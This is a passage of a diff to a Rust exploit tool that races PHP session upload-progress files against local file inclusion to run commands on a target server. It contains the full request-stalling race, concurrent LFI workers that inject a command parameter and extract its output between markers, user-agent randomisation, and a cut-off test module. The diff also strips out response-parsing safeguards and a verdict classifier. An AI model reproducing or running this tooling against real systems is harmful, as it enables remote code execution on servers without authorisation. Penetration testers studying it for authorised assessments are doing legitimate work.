-// Host header helper (IPv6-safe, omits default ports)
-// ============================================================================
-
-fn host_header(host: &str, port: u16, https: bool) -> String {
-    let default_port = (https && port == 443) || (!https && port == 80);
-    let h = if host.contains(':') && !host.starts_with('[') {
-        format!("[{}]", host)
-    } else {
-        host.to_string()
-    };
-    if default_port {
-        h
-    } else {
-        format!("{}:{}", h, port)
-    }
-}
-
-// ============================================================================
+// ============================================================
 // Race request construction
-// ============================================================================
+// ============================================================
 
 struct RaceRequest {
     header_bytes: Vec<u8>,
@@ -945,15 +730,16 @@ fn build_race_request(cfg: &Config, payload: &str) -> RaceRequest {
 
     let mut part1 = prefix;
     part1.extend_from_slice(&chunk1);
+
     let mut part2 = chunk2;
     part2.extend_from_slice(&suffix);
+
     let total_len = part1.len() + part2.len();
     let cookie = build_cookie_header(cfg);
-    let hostport = host_header(&cfg.host, cfg.port, cfg.https);
 
     let mut header_bytes = format!(
         "POST {path} HTTP/1.1\r\n\
-         Host: {hp}\r\n\
+         Host: {host}\r\n\
          User-Agent: {ua}\r\n\
          Accept: */*\r\n\
          Content-Type: multipart/form-data; boundary={b}\r\n\
@@ -961,7 +747,7 @@ fn build_race_request(cfg: &Config, payload: &str) -> RaceRequest {
          Cookie: {ck}\r\n\
          Connection: close\r\n",
         path = cfg.post_path,
-        hp = hostport,
+        host = cfg.host,
         ua = cfg.user_agent,
         b = boundary,
         cl = total_len,
@@ -975,12 +761,7 @@ fn build_race_request(cfg: &Config, payload: &str) -> RaceRequest {
     }
     header_bytes.extend_from_slice(b"\r\n");
 
-    RaceRequest {
-        header_bytes,
-        part1_bytes: part1,
-        part2_bytes: part2,
-        total_len,
-    }
+    RaceRequest { header_bytes, part1_bytes: part1, part2_bytes: part2, total_len }
 }
 
 fn build_cookie_header(cfg: &Config) -> String {
@@ -991,9 +772,9 @@ fn build_cookie_header(cfg: &Config) -> String {
             if p.is_empty() {
                 continue;
             }
-            if p.to_lowercase()
-                .starts_with(&format!("{}=", cfg.session_name.to_lowercase()))
-            {
+            let lc = p.to_lowercase();
+            let prefix = format!("{}=", cfg.session_name.to_lowercase());
+            if lc.starts_with(&prefix) {
                 continue;
             }
             parts.push(p.to_string());
@@ -1003,15 +784,18 @@ fn build_cookie_header(cfg: &Config) -> String {
     parts.join("; ")
 }
 
-// ============================================================================
+// ============================================================
 // Race + concurrent LFI
-// ============================================================================
+// ============================================================
 
-fn race_with_lfi(cfg: &Config, req: &RaceRequest) -> (RawResponse, Vec<LfiHit>, usize) {
+fn race_with_lfi(
+    cfg: &Config,
+    req: &RaceRequest,
+) -> (RawResponse, Vec<(String, bool)>, usize) {
     let stop = Arc::new(AtomicBool::new(false));
     let found = Arc::new(AtomicBool::new(false));
-    let attempts = Arc::new(AtomicUsize::new(0));
-    let max_attempts = cfg.lfi_max_attempts;
+    let lfi_count = Arc::new(AtomicUsize::new(0));
+    let max_requests = cfg.lfi_max_requests;
 
     let mut workers = Vec::new();
     if let Some(tpl) = cfg.lfi_template.clone() {
@@ -1019,28 +803,35 @@ fn race_with_lfi(cfg: &Config, req: &RaceRequest) -> (RawResponse, Vec<LfiHit>, 
             let cfg = cfg.clone();
             let stop = stop.clone();
             let found = found.clone();
-            let attempts = attempts.clone();
+            let counter = lfi_count.clone();
             let tpl = tpl.clone();
-            workers.push(thread::spawn(move || -> Option<LfiHit> {
+            workers.push(thread::spawn(move || -> Option<(String, bool)> {
                 let client = match http_client(&cfg, false) {
                     Ok(c) => c,
                     Err(e) => {
-                        eprintln!("[!] LFI worker {}: {}", i, e);
+                        eprintln!("[!] LFI worker {} failed to init client: {}", i, e);
                         return None;
                     }
                 };
                 let url = build_lfi_url(&cfg, &tpl);
                 let mut first_logged = false;
+
                 while !stop.load(Ordering::Relaxed) && !found.load(Ordering::Relaxed) {
-                    if !try_reserve(&attempts, max_attempts) {
+                    if counter.load(Ordering::Relaxed) >= max_requests {
+                        if cfg.verbose {
+                            eprintln!("[*] LFI worker {} hit --lfi-max-requests cap", i);
+                        }
                         break;
                     }
                     match lfi_probe(&cfg, &client, &url, &mut first_logged, i) {
-                        Ok(Some(hit)) => {
+                        Ok(Some(out)) => {
                             found.store(true, Ordering::Relaxed);
-                            return Some(hit);
+                            counter.fetch_add(1, Ordering::Relaxed);
+                            return Some(out);
                         }
-                        Ok(None) => {}
+                        Ok(None) => {
+                            counter.fetch_add(1, Ordering::Relaxed);
+                        }
                         Err(e) => {
                             if cfg.verbose {
                                 eprintln!("[!] LFI worker {}: {}", i, e);
@@ -1054,13 +845,7 @@ fn race_with_lfi(cfg: &Config, req: &RaceRequest) -> (RawResponse, Vec<LfiHit>, 
         }
     }
 
-    let race = match send_throttled_upload(cfg, req) {
-        Ok(r) => r,
-        Err(e) => RawResponse {
-            transport_error: Some(e),
-            ..Default::default()
-        },
-    };
+    let race_result = send_throttled_upload(cfg, req);
 
     stop.store(true, Ordering::Relaxed);
     let mut hits = Vec::new();
@@ -1068,15 +853,23 @@ fn race_with_lfi(cfg: &Config, req: &RaceRequest) -> (RawResponse, Vec<LfiHit>, 
         match w.join() {
             Ok(Some(h)) => hits.push(h),
             Ok(None) => {}
-            Err(e) => eprintln!("[!] worker panicked: {:?}", e),
+            Err(e) => eprintln!("[!] LFI worker panicked: {:?}", e),
         }
     }
-    let lfi_attempts = attempts.load(Ordering::Relaxed);
-    (race, hits, lfi_attempts)
+
+    // Never discard hits on race failure — a crash is a finding, and we may
+    // have already proven RCE mid-stall.
+    let race = race_result.unwrap_or_else(|e| RawResponse {
+        transport_error: Some(e),
+        ..Default::default()
+    });
+    let lfi_requests = lfi_count.load(Ordering::Relaxed);
+    (race, hits, lfi_requests)
 }
 
 fn send_throttled_upload(cfg: &Config, req: &RaceRequest) -> Result<RawResponse, String> {
     let mut conn = open_connection(cfg)?;
+
     conn.write_all(&req.header_bytes)
         .map_err(|e| format!("write headers: {}", e))?;
     conn.write_all(&req.part1_bytes)
@@ -1084,53 +877,60 @@ fn send_throttled_upload(cfg: &Config, req: &RaceRequest) -> Result<RawResponse,
     conn.flush().map_err(|e| format!("flush part1: {}", e))?;
     if cfg.verbose {
         eprintln!(
-            "[*] sent {} bytes; stalling {:?}",
+            "[*] Sent {} bytes; stalling {:?} (progress file should exist now)",
             req.header_bytes.len() + req.part1_bytes.len(),
             cfg.stall
         );
     }
+
     thread::sleep(cfg.stall);
+
     conn.write_all(&req.part2_bytes)
         .map_err(|e| format!("write part2: {}", e))?;
     conn.flush().map_err(|e| format!("flush part2: {}", e))?;
+    if cfg.verbose {
+        eprintln!("[*] Sent {} more bytes; reading response", req.part2_bytes.len());
+    }
+
     read_raw_response(cfg, &mut *conn)
 }
 
-// ============================================================================
+// ============================================================
 // Connection setup
-// ============================================================================
+// ============================================================
 
 fn open_connection(cfg: &Config) -> Result<Box<dyn ReadWrite>, String> {
     let tcp = open_tcp(cfg)?;
-    if !cfg.https {
-        return Ok(Box::new(tcp));
+    if cfg.https {
+        let mut b = TlsConnector::builder();
+        if cfg.insecure {
+            b.danger_accept_invalid_certs(true);
+            b.danger_accept_invalid_hostnames(true);
+        }
+        let tls = b
+            .build()
+            .map_err(|e| format!("TLS build: {}", e))?
+            .connect(&cfg.host, tcp)
+            .map_err(|e| format!("TLS handshake: {}", e))?;
+        tls.get_ref().set_nodelay(true).ok();
+        Ok(Box::new(tls))
+    } else {
+        Ok(Box::new(tcp))
     }
-
-    let mut b = TlsConnector::builder();
-    if cfg.insecure {
-        b.danger_accept_invalid_certs(true);
-        b.danger_accept_invalid_hostnames(true);
-    } else if cfg.no_verify_hostname {
-        b.danger_accept_invalid_hostnames(true);
-    }
-    let tls = b
-        .build()
-        .map_err(|e| format!("TLS build: {}", e))?
-        .connect(cfg.sni.as_deref().unwrap_or(&cfg.host), tcp)
-        .map_err(|e| format!("TLS handshake: {}", e))?;
-    tls.get_ref().set_nodelay(true).ok();
-    Ok(Box::new(tls))
 }
 
 fn open_tcp(cfg: &Config) -> Result<TcpStream, String> {
     if let Some(proxy) = &cfg.proxy {
         return open_tcp_via_proxy(cfg, proxy);
     }
-    let addrs: Vec<_> = (cfg.host.as_str(), cfg.port)
+
+    let addr = format!("{}:{}", cfg.host, cfg.port);
+    let addrs: Vec<_> = addr
         .to_socket_addrs()
-        .map_err(|e| format!("resolve {}:{}: {}", cfg.host, cfg.port, e))?
+        .map_err(|e| format!("resolve {}: {}", addr, e))?
         .collect();
-    let mut last_err = "no addresses resolved".to_string();
+
+    let mut last_err = String::from("no addresses resolved");
     for a in &addrs {
         match TcpStream::connect(a) {
             Ok(s) => {
@@ -1139,30 +939,35 @@ fn open_tcp(cfg: &Config) -> Result<TcpStream, String> {
                 s.set_write_timeout(Some(cfg.timeout)).ok();
                 return Ok(s);
             }
-            Err(e) => last_err = e.to_string(),
+            Err(e) => last_err = format!("{}", e),
         }
     }
-    Err(format!("connect {}:{}: {}", cfg.host, cfg.port, last_err))
+    Err(format!("connect {}: {}", addr, last_err))
 }
 
 fn open_tcp_via_proxy(cfg: &Config, proxy: &str) -> Result<TcpStream, String> {
     let url = Url::parse(proxy).map_err(|e| format!("parse proxy '{}': {}", proxy, e))?;
-    if url.scheme() != "http" {
+    let scheme = url.scheme();
+    if scheme != "http" {
         return Err(format!(
-            "raw race socket only supports http:// proxies (got '{}'); \
-             socks5 works for LFI only (reqwest `socks` feature)",
-            url.scheme()
+            "raw race socket only supports http:// proxies (got '{}'). \
+             SOCKS works for LFI only.",
+            scheme
         ));
     }
     let ph = url.host_str().ok_or("proxy URL missing host")?;
     let pp = url.port().unwrap_or(8080);
+
     let mut s = TcpStream::connect((ph, pp)).map_err(|e| format!("proxy connect: {}", e))?;
     s.set_nodelay(true).ok();
     s.set_read_timeout(Some(cfg.timeout)).ok();
     s.set_write_timeout(Some(cfg.timeout)).ok();
 
-    let target = host_header(&cfg.host, cfg.port, cfg.https);
-    let connect = format!("CONNECT {t} HTTP/1.1\r\nHost: {t}\r\n\r\n", t = target);
+    let connect = format!(
+        "CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n",
+        host = cfg.host,
+        port = cfg.port,
+    );
     s.write_all(connect.as_bytes()).map_err(|e| e.to_string())?;
 
     let mut buf = Vec::new();
@@ -1188,9 +993,9 @@ fn open_tcp_via_proxy(cfg: &Config, proxy: &str) -> Result<TcpStream, String> {
     Ok(s)
 }
 
-// ============================================================================
-// Raw response reader
-// ============================================================================
+// ============================================================
+// Raw response reader (1xx-safe, O(n) header scan)
+// ============================================================
 
 fn read_raw_response(cfg: &Config, conn: &mut dyn ReadWrite) -> Result<RawResponse, String> {
     let mut buf = Vec::new();
@@ -1199,81 +1004,49 @@ fn read_raw_response(cfg: &Config, conn: &mut dyn ReadWrite) -> Result<RawRespon
     let mut timed_out = false;
     let mut transport_error: Option<String> = None;
 
-    let mut header_start: usize = 0;
     let mut header_end: Option<usize> = None;
     let mut content_length: Option<usize> = None;
     let mut has_te = false;
     let mut search_from = 0usize;
 
     loop {
-        if transport_error.is_some() {
-            break;
-        }
         if Instant::now() >= deadline {
             timed_out = true;
             break;
         }
-        // Content-Length early-exit only applies when TE is not chunked
-        // (RFC 7230 §3.3.3: chunked wins when both are present).
-        if !has_te {
-            if let (Some(h), Some(cl)) = (header_end, content_length) {
-                if buf.len() >= h + 4 + cl {
-                    break;
-                }
+
+        if let (Some(h), Some(cl)) = (header_end, content_length) {
+            if buf.len() >= h + 4 + cl {
+                break;
             }
         }
 
         match conn.read(&mut tmp) {
             Ok(0) => break,
             Ok(n) => {
-                if buf
-                    .len()
-                    .checked_add(n)
-                    .is_none_or(|l| l > MAX_RAW_RESPONSE_BUFFER)
-                {
-                    transport_error = Some(format!(
-                        "raw response buffer exceeded {} bytes",
-                        MAX_RAW_RESPONSE_BUFFER
-                    ));
-                    break;
-                }
                 buf.extend_from_slice(&tmp[..n]);
 
                 if header_end.is_none() {
-                    // Header parse MUST precede the chunked-completion check
-                    // below: a single read can carry the final header block
-                    // AND the complete chunked body. Do not reorder.
                     while let Some(rel) = find_subslice(&buf[search_from..], b"\r\n\r\n") {
                         let abs = search_from + rel;
-                        if parse_status_from_head(&buf[search_from..abs])
+                        if parse_status_from_head(&buf[..abs])
                             .map(|s| (100..200).contains(&s))
                             .unwrap_or(false)
                         {
+                            // skip 1xx block
                             search_from = abs + 4;
                             continue;
                         }
-                        header_start = search_from;
                         header_end = Some(abs);
-                        // FIX: header slice starts at search_from, not 0 —
-                        // interim blocks must not contaminate the final one.
-                        let head_lower =
-                            String::from_utf8_lossy(&buf[search_from..abs]).to_lowercase();
+                        let head_lower = String::from_utf8_lossy(&buf[..abs]).to_lowercase();
                         content_length = parse_content_length(&head_lower);
-                        has_te = head_lower.lines().any(|l| {
-                            l.strip_prefix("transfer-encoding:")
-                                .map(|v| v.trim().contains("chunked"))
-                                .unwrap_or(false)
-                        });
+                        has_te = head_lower.contains("transfer-encoding:");
                         break;
                     }
                 }
 
-                if let Some(h) = header_end {
-                    if has_te {
-                        if let ChunkedState::Complete(_) = try_decode_chunked(&buf[h + 4..]) {
-                            break;
-                        }
-                    }
+                if header_end.is_some() && content_length.is_none() && !has_te {
+                    // no CL, no TE → rely on EOF / deadline
                 }
             }
             Err(e) => {
@@ -1288,15 +1061,7 @@ fn read_raw_response(cfg: &Config, conn: &mut dyn ReadWrite) -> Result<RawRespon
         }
     }
 
-    let r = match header_end {
-        Some(h) => parse_raw_response(&buf, header_start, h, has_te, timed_out, transport_error),
-        None => RawResponse {
-            timed_out,
-            transport_error,
-            ..Default::default()
-        },
-    };
-    Ok(r)
+    Ok(parse_raw_response(&buf, header_end, timed_out, transport_error))
 }
 
 fn parse_status_from_head(head: &[u8]) -> Option<u16> {
@@ -1315,77 +1080,9 @@ fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
     haystack.windows(needle.len()).position(|w| w == needle)
 }
 
-fn try_decode_chunked(body: &[u8]) -> ChunkedState {
-    let mut out = Vec::with_capacity(body.len().min(64 * 1024));
-    let mut i = 0usize;
-    loop {
-        let Some(rel) = find_subslice(&body[i..], b"\r\n") else {
-            return ChunkedState::Incomplete;
-        };
-        let line = &body[i..i + rel];
-        let size_str = line.split(|&b| b == b';').next().unwrap_or(line);
-        let size_hex = match std::str::from_utf8(size_str) {
-            Ok(s) => s.trim(),
-            Err(_) => return ChunkedState::Malformed("non-utf8 chunk size".into()),
-        };
-        let size = match usize::from_str_radix(size_hex, 16) {
-            Ok(s) => s,
-            Err(_) => return ChunkedState::Malformed(format!("bad chunk size {:?}", size_hex)),
-        };
-        i += rel + 2;
-
-        if size == 0 {
-            let mut trailer_bytes = 0usize;
-            let mut trailer_count = 0usize;
-            loop {
-                let Some(te) = find_subslice(&body[i..], b"\r\n") else {
-                    return ChunkedState::Incomplete;
-                };
-                let trailer = &body[i..i + te];
-                i += te + 2;
-                if trailer.is_empty() {
-                    return ChunkedState::Complete(out);
-                }
-                trailer_bytes = match trailer_bytes.checked_add(trailer.len()) {
-                    Some(b) => b,
-                    None => return ChunkedState::Malformed("trailer byte overflow".into()),
-                };
-                trailer_count += 1;
-                if trailer_bytes > MAX_TRAILER_BYTES {
-                    return ChunkedState::Malformed("trailer bytes exceeded".into());
-                }
-                if trailer_count > MAX_TRAILER_COUNT {
-                    return ChunkedState::Malformed("trailer count exceeded".into());
-                }
-            }
-        }
-
-        let Some(new_len) = out.len().checked_add(size) else {
-            return ChunkedState::Malformed("chunk length overflow".into());
-        };
-        if new_len > MAX_CHUNKED_BODY {
-            return ChunkedState::Malformed("decoded body exceeded limit".into());
-        }
-        let Some(end) = i.checked_add(size).and_then(|x| x.checked_add(2)) else {
-            return ChunkedState::Malformed("chunk length overflow".into());
-        };
-        if body.len() < end {
-            return ChunkedState::Incomplete;
-        }
-        out.extend_from_slice(&body[i..i + size]);
-        i += size;
-        if &body[i..i + 2] != b"\r\n" {
-            return ChunkedState::Malformed("missing CRLF after chunk data".into());
-        }
-        i += 2;
-    }
-}
-
 fn parse_raw_response(
     buf: &[u8],
-    header_start: usize,
-    header_end: usize,
-    has_te: bool,
+    header_end: Option<usize>,
     timed_out: bool,
     transport_error: Option<String>,
 ) -> RawResponse {
@@ -1394,101 +1091,64 @@ fn parse_raw_response(
         transport_error,
         ..Default::default()
     };
-    let head = String::from_utf8_lossy(&buf[header_start..header_end]);
+    let Some(h) = header_end else { return r };
+    let head = String::from_utf8_lossy(&buf[..h]);
     let mut lines = head.lines();
-    if let Some(sl) = lines.next() {
-        r.status = sl.split_whitespace().nth(1).and_then(|s| s.parse().ok());
+    if let Some(status_line) = lines.next() {
+        r.status = status_line.split_whitespace().nth(1).and_then(|s| s.parse().ok());
     }
     for line in lines {
-        let Some((k, v)) = line.split_once(':') else {
-            continue;
-        };
-        let v = v.trim();
-        match k.trim().to_lowercase().as_str() {
-            "set-cookie" => r.set_cookie.push(v.to_string()),
-            "location" => r.location = Some(v.to_string()),
-            "retry-after" => r.retry_after = Some(v.to_string()),
-            "x-ratelimit-remaining" | "x-rate-limit-remaining" if v == "0" => {
-                r.rate_limit_signal = Some(format!("{}: {}", k.trim(), v));
-            }
-            _ => {}
-        }
-    }
-
-    let raw_body = &buf[header_end + 4..];
-    if has_te {
-        match try_decode_chunked(raw_body) {
-            ChunkedState::Complete(decoded) => r.body = decoded,
-            ChunkedState::Malformed(e) => {
-                if r.transport_error.is_none() {
-                    r.transport_error = Some(e);
-                }
-            }
-            ChunkedState::Incomplete => {
-                if r.transport_error.is_none() {
-                    r.transport_error = Some("chunked: truncated".into());
-                }
+        if let Some((k, v)) = line.split_once(':') {
+            match k.trim().to_lowercase().as_str() {
+                "set-cookie" => r.set_cookie.push(v.trim().to_string()),
+                "location" => r.location = Some(v.trim().to_string()),
+                _ => {}
             }
         }
-    } else {
-        r.body = raw_body.to_vec();
     }
+    r.body = buf[h + 4..].to_vec();
     r
 }
 
-// ============================================================================
-// Session / redirect helpers
-// ============================================================================
+// ============================================================
+// Session helpers
+// ============================================================
 
 fn sid_was_regenerated(cfg: &Config, race: &RawResponse) -> bool {
-    let name = cfg.session_name.to_lowercase();
+    let ours = cfg.sid.as_str();
+    let name_lower = cfg.session_name.to_lowercase();
     race.set_cookie.iter().any(|c| {
         c.split(';')
             .next()
             .and_then(|kv| kv.trim().split_once('='))
-            .map(|(k, v)| k.to_lowercase() == name && v.trim() != cfg.sid)
+            .map(|(k, v)| k.to_lowercase() == name_lower && v.trim() != ours)
             .unwrap_or(false)
     })
 }
 
-fn is_login_gate(cfg: &Config, race: &RawResponse) -> bool {
-    let Some(loc) = &race.location else {
-        return false;
-    };
-    let Ok(base) = Url::parse(&cfg.target) else {
-        return false;
-    };
-    let Ok(loc_url) = base.join(loc) else {
-        return false;
-    };
-    if loc_url.host_str() != base.host_str() {
-        return false;
-    }
-    let lower = loc.to_lowercase();
+fn looks_like_login(loc: Option<&str>) -> bool {
+    let Some(l) = loc else { return false };
+    let lower = l.to_lowercase();
     [
-        "login",
-        "signin",
-        "sign-in",
-        "sign_in",
-        "auth",
-        "session/new",
-        "account/login",
-        "wp-login",
-        "admin/login",
+        "login", "signin", "sign-in", "sign_in", "auth", "session/new",
+        "account/login", "wp-login", "admin/login",
     ]
     .iter()
     .any(|k| lower.contains(k))
 }
 
-// ============================================================================
-// LFI probe
-// ============================================================================
+// ============================================================
+// LFI verification
+// ============================================================
 
 fn build_lfi_url(cfg: &Config, template: &str) -> String {
+    let sid_enc = urlencoding::encode(&cfg.sid);
+    let cmd_enc = urlencoding::encode(&cfg.cmd);
+    let param_enc = urlencoding::encode(&cfg.param);
     template
-        .replace("%SID%", &urlencoding::encode(&cfg.sid))
-        .replace("%CMD%", &urlencoding::encode(&cfg.cmd))
-        .replace("%PARAM%", &urlencoding::encode(&cfg.param))
+        .replace("%SID%", &sid_enc)
+        .replace("%CMD%", &cmd_enc)
+        .replace("%PARAM%", &param_enc)
 }
 
 fn lfi_probe(
@@ -1497,17 +1157,17 @@ fn lfi_probe(
     url: &str,
     first_logged: &mut bool,
     worker: usize,
-) -> Result<Option<LfiHit>, String> {
-    let mut resp: HttpResponse = client
+) -> Result<Option<(String, bool)>, String> {
+    let req = client
         .get(url)
-        .header(reqwest::header::COOKIE, build_cookie_header(cfg))
-        .send()
-        .map_err(|e| e.to_string())?;
+        .header(reqwest::header::COOKIE, build_cookie_header(cfg));
+
+    let mut resp: HttpResponse = req.send().map_err(|e| e.to_string())?;
 
     if cfg.verbose {
         let st = resp.status().as_u16();
         if st != 200 || !*first_logged {
-            eprintln!("[w{}] LFI -> {}", worker, st);
+            eprintln!("[w{}] LFI {} -> {}", worker, url, st);
             if st == 200 {
                 *first_logged = true;
             }
@@ -1538,14 +1198,13 @@ fn lfi_probe(
         } else {
             out
         };
-        return Ok(Some(LfiHit {
-            output: out,
-            disabled,
-        }));
+        return Ok(Some((out, disabled)));
     }
     Ok(None)
 }
 
+/// Require two markers bracketing the output, preferring the last adjacent pair
+/// so reflection + execution both appearing doesn't extract the wrong span.
 fn extract_execution(body: &str, marker: &str) -> Option<String> {
     let idx: Vec<usize> = body.match_indices(marker).map(|(i, _)| i).collect();
     if idx.len() < 2 {
@@ -1559,134 +1218,9 @@ fn extract_execution(body: &str, marker: &str) -> Option<String> {
     Some(body[a + marker.len()..b].to_string())
 }
 
-// ============================================================================
-// Verdict classification — deterministic
-// ============================================================================
-
-/// Precedence, in order:
-///
-///   1. transport failure / timeout                → Unknown
-///   2. 429, or explicit rate-limit header         → RateLimited
-///   3. 401                                        → AuthRequired
-///   4. 3xx + Location matches login gate          → AuthRequired
-///   5. 3xx + Location does not match login gate   → HttpError
-///   6. 5xx                                        → HttpError
-///   7. any LFI hit                                → Unconfirmed
-///   8. LFI probed, no hit                         → NoLfi
-///   9. 2xx, no LFI template (could not probe)     → Unconfirmed
-///  10. otherwise                                  → Unknown
-///
-/// `Retry-After` is surfaced as a note and in the `retry_after` report field
-/// but does **not** influence the verdict — it signals a requested delay,
-/// not proof of rate limiting.
-fn classify(
-    cfg: &Config,
-    race: &RawResponse,
-    hits: &[LfiHit],
-    lfi_attempts: usize,
-) -> (Verdict, String, Vec<String>) {
-    let mut notes = Vec::new();
-
-    let race_note = if race.timed_out {
-        notes.push("race POST timed out".into());
-        "timeout on throttled upload".to_string()
-    } else if let Some(e) = &race.transport_error {
-        notes.push(format!("race POST transport error: {}", e));
-        format!("transport error: {}", e)
-    } else if let Some(s) = race.status {
-        if s == 429 {
-            notes.push("race POST returned 429".into());
-            "HTTP 429 (rate limited)".to_string()
-        } else if race.rate_limit_signal.is_some() {
-            notes.push(format!(
-                "rate-limit signal: {}",
-                race.rate_limit_signal.as_deref().unwrap_or("")
-            ));
-            format!("HTTP {} (rate-limit signal)", s)
-        } else if (500..600).contains(&s) {
-            notes.push(format!("race POST returned {}", s));
-            format!("HTTP {} from upload handler", s)
-        } else if (300..400).contains(&s) {
-            if is_login_gate(cfg, race) {
-                "HTTP 3xx → login gate".to_string()
-            } else {
-                format!(
-                    "HTTP 3xx → {}",
-                    race.location.as_deref().unwrap_or("(no Location)")
-                )
-            }
-        } else {
-            format!("HTTP {}", s)
-        }
-    } else {
-        "no HTTP status observed".to_string()
-    };
-
-    if let Some(ra) = &race.retry_after {
-        notes.push(format!(
-            "server sent Retry-After: {} (HTTP {}) — not interpreted as rate limiting",
-            ra,
-            race.status
-                .map(|s| s.to_string())
-                .unwrap_or_else(|| "?".into()),
-        ));
-    }
-
-    let rate_limited = race.status == Some(429) || race.rate_limit_signal.is_some();
-
-    let verdict = if race.timed_out || race.transport_error.is_some() {
-        Verdict::Unknown
-    } else if rate_limited {
-        Verdict::RateLimited
-    } else if race.status == Some(401) {
-        Verdict::AuthRequired
-    } else if race.is_3xx() {
-        if is_login_gate(cfg, race) {
-            Verdict::AuthRequired
-        } else {
-            Verdict::HttpError
-        }
-    } else if race.is_5xx() {
-        Verdict::HttpError
-    } else if !hits.is_empty() {
-        let h = &hits[0];
-        if h.disabled {
-            notes.push("marker pair present, content includes a disabled-function warning".into());
-        } else if h.output.trim().is_empty() || h.output == "[executed — empty output]" {
-            notes.push(
-                "marker pair present, content empty — command may be disabled or returned nothing"
-                    .into(),
-            );
-        } else {
-            notes.push("marker pair present with content — reflection cannot be ruled out; verdict capped at UNCONFIRMED".into());
-        }
-        Verdict::Unconfirmed
-    } else if lfi_attempts > 0 {
-        // Attempts, not confirmed dispatches. NoLfi means "we tried and saw
-        // nothing," not "we are certain N requests reached the target."
-        notes.push(format!(
-            "{} LFI probe attempts ran and did not demonstrate inclusion",
-            lfi_attempts
-        ));
-        Verdict::NoLfi
-    } else if race.is_2xx() {
-        if cfg.lfi_template.is_none() {
-            notes.push(
-                "2xx from upload handler; no --lfi template so inclusion could not be probed"
-                    .into(),
-            );
-        }
-        Verdict::Unconfirmed
-    } else {
-        Verdict::Unknown
-    };
-
-    (verdict, race_note, notes)
-}
-
-// ============================================================================
+// ============================================================
 // Config assembly
-// ============================================================================
+// ============================================================
 
 fn build_config(cli: Cli) -> Result<Config, String> {
     validate_no_crlf("--param", &cli.param)?;
@@ -1699,22 +1233,14 @@ fn build_config(cli: Cli) -> Result<Config, String> {
         "http" => false,
         other => return Err(format!("unsupported scheme '{}'", other)),
     };
-    let host_raw = url.host_str().ok_or("URL missing host")?.to_string();
-    let host = if host_raw.starts_with('[') && host_raw.ends_with(']') {
-        host_raw[1..host_raw.len() - 1].to_string()
-    } else {
-        host_raw
-    };
+    let host = url.host_str().ok_or("URL missing host")?.to_string();
     let port = url.port_or_known_default().ok_or("cannot determine port")?;
     let post_path = cli.post_path.clone().unwrap_or_else(|| {
         let p = url.path();
-        if p.is_empty() {
-            "/".to_string()
-        } else {
-            p.to_string()
-        }
+        if p.is_empty() { "/".to_string() } else { p.to_string() }
     });
 
+    // Merge `--header "Cookie: ..."` into --cookie; reject duplicates at source.
     let mut cookie_parts: Vec<String> = Vec::new();
     if let Some(c) = &cli.cookie {
         cookie_parts.push(c.clone());
@@ -1740,6 +1266,7 @@ fn build_config(cli: Cli) -> Result<Config, String> {
         Some(s) => (s, true),
         None => (random_sid(cli.sid_length, sid_charset), false),
     };
+
     let user_agent = cli.user_agent.clone().unwrap_or_else(random_ua);
 
     Ok(Config {
@@ -1756,17 +1283,16 @@ fn build_config(cli: Cli) -> Result<Config, String> {
         param: cli.param,
         sid,
         sid_explicit,
+        sid_length: cli.sid_length,
         sid_charset,
         session_name: cli.session_name,
         insecure: cli.insecure,
-        no_verify_hostname: cli.no_verify_hostname,
-        sni: cli.sni,
         verbose: cli.verbose,
         dry_run: cli.dry_run,
         lfi_template: cli.lfi,
         lfi_workers: cli.lfi_workers.max(1),
         lfi_interval: Duration::from_millis(cli.lfi_interval),
-        lfi_max_attempts: cli.lfi_max_attempts.max(1),
+        lfi_max_requests: cli.lfi_max_requests.max(1),
         cookie,
         headers: filtered_headers,
         proxy: cli.proxy,
@@ -1784,22 +1310,9 @@ fn validate_no_crlf(field: &str, value: &str) -> Result<(), String> {
     Ok(())
 }
 
-// ============================================================================
+// ============================================================
 // Utilities
-// ============================================================================
-
-fn try_reserve(counter: &AtomicUsize, max: usize) -> bool {
-    let mut cur = counter.load(Ordering::Relaxed);
-    loop {
-        if cur >= max {
-            return false;
-        }
-        match counter.compare_exchange_weak(cur, cur + 1, Ordering::Relaxed, Ordering::Relaxed) {
-            Ok(_) => return true,
-            Err(c) => cur = c,
-        }
-    }
-}
+// ============================================================
 
 fn random_alnum(n: usize) -> String {
     rand::thread_rng()
@@ -1822,299 +1335,7 @@ fn random_ua() -> String {
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
         "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
     ];
     UAS[rand::thread_rng().gen_range(0..UAS.len())].to_string()
-}
-
-// ============================================================================
-// Tests — the three load-bearing regressions are pinned below.
-// ============================================================================
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-
-    fn test_config() -> Config {
-        Config {
-            target: "http://example.test/".into(),
-            host: "example.test".into(),
-            port: 80,
-            https: false,
-            post_path: "/".into(),
-            user_agent: "test".into(),
-            stall: Duration::from_millis(3000),
-            timeout: Duration::from_secs(5),
-            progress_field: "PHP_SESSION_UPLOAD_PROGRESS".into(),
-            cmd: "id".into(),
-            param: "c".into(),
-            sid: "test".into(),
-            sid_explicit: false,
-            sid_charset: SidCharset::Default5,
-            session_name: "PHPSESSID".into(),
-            insecure: false,
-            no_verify_hostname: false,
-            sni: None,
-            verbose: false,
-            dry_run: false,
-            lfi_template: Some("http://example.test/x?f=%SID%".into()),
-            lfi_workers: 1,
-            lfi_interval: Duration::from_millis(100),
-            lfi_max_attempts: 100,
-            cookie: None,
-            headers: Vec::new(),
-            proxy: None,
-            output_json: None,
-            skip_fingerprint: true,
-            marker: "PFMARK_test".into(),
-            retries: 1,
-        }
-    }
-
-    fn rr_status(s: u16) -> RawResponse {
-        RawResponse {
-            status: Some(s),
-            ..Default::default()
-        }
-    }
-
-    // --- Regression: 1xx block parsing must skip interim responses ---
-
-    #[test]
-    fn parse_status_skips_1xx() {
-        let buf = b"HTTP/1.1 100 Continue\r\n\r\nHTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nhi";
-        let first = find_subslice(buf, b"\r\n\r\n").unwrap();
